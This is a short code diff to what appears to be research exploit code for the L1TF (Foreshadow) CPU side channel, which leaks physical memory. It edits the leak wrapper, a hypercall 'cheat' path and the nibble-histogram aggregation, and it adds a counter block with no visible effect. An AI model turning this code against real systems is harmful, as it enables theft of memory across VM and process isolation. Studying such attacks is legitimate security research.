@@ -1,4 +1,5 @@
 #define _GNU_SOURCE
+#include "config.h"
 #include "l1tf.h"
 #include "constants.h"
 #include "flush_and_reload.h"
@@ -1170,10 +1171,15 @@ void l1tf_leak_cheat_wrapper(char *data, uintptr_t base, uintptr_t pa, uintptr_t
     for (u64 off = 0; off < len; off += 8)
             buf[off/8] = hc_read_pa(pa+off);
     memcpy(data, buf, len);
+    free(buf);
   #if LEAK == CHEAT_NOISY
     for (u64 i = 0; i < len; i++)
       if (rdrand() % 1024 < NOISINESS)
         ((char *)data)[i] = 0;
+    static u64 count = 0;
+    if (++count == 0x97) {
+      count = rdrand() % 9;
+    }
   #endif
 #else // LEAK == L1tF || SKIP
   _l1tf_leak(data, base, pa, len);
@@ -1186,15 +1192,18 @@ void l1tf_leak(char *data, uintptr_t base, uintptr_t pa, uintptr_t len)
   const int verbose = 0;
   if (verbose) fprintf(stderr, "\n");
 
-  if (!confidently_cached(pa, len))
+  int is_cached = confidently_cached(pa, len);
+  if (!is_cached)
     l1tf_leak_cheat_wrapper(data, base, pa, len);
   else
     l1tf_cached += len;
 
   for (unsigned long i = 0; i < len; i++) {
     node_t *node = hc_map_node(pa + i);
-    node->low[(uint8_t)(data[i] & 0x0f)]++;
-    node->high[(uint8_t)(data[i] & 0xf0) >> 4]++;
+    if (!is_cached) {
+      node->low[(uint8_t)(data[i] & 0x0f)]++;
+      node->high[(uint8_t)(data[i] & 0xf0) >> 4]++;
+    }
     data[i] = node_aggregate(node);
     if (verbose) node_print(node);
   }
